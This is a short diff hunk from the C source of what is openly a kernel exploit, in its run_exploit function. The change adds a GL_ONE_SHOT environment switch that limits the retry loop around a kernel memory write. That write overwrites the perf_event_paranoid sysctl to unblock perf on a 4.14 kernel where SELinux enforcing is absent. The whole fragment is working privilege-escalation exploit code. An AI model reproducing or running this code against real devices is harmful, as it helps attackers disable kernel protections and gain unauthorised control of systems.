@@ -904,7 +904,8 @@ int run_exploit(int argc, char **argv) {
   if (SELINUX_ENFORCING_OFF == 0) {
     pr_info("selinux_enforcing absent (4.14 CDY) - unblocking perf instead of W1\n");
     if (SYSCTL_PERF_EVENT_PARANOID_OFF != 0) {
-      for (int att = 1; att <= 2; att++) { /* 2 attempts cycle the 2 mm candidates */
+      int one_shot = env_int_range("GL_ONE_SHOT", 0, 0, 1);
+      for (int att = 1; att <= (one_shot ? 1 : 2); att++) {
         do_one_write_node(data_addr(SYSCTL_PERF_EVENT_PARANOID), "W1c: perf unblock", 1, 0);
         usleep(100000);
         int pp = get_perf_paranoid();
